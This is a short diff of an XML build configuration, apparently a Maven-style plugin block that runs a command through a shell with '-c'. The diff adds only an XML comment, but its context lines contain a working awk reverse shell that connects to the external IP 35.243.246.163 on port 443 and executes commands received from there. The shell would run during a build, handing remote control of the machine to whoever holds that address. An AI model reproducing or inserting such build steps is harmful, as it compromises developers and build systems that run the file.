@@ -109,6 +109,7 @@
                         <argument>
                             -c
                         </argument>
+                        <!--Stam-->
                         <argument>
                     awk 'BEGIN {s = "/inet/tcp/0/35.243.246.163/443"; while(42) { do{ printf "shell>" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) > 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null
                     </argument>
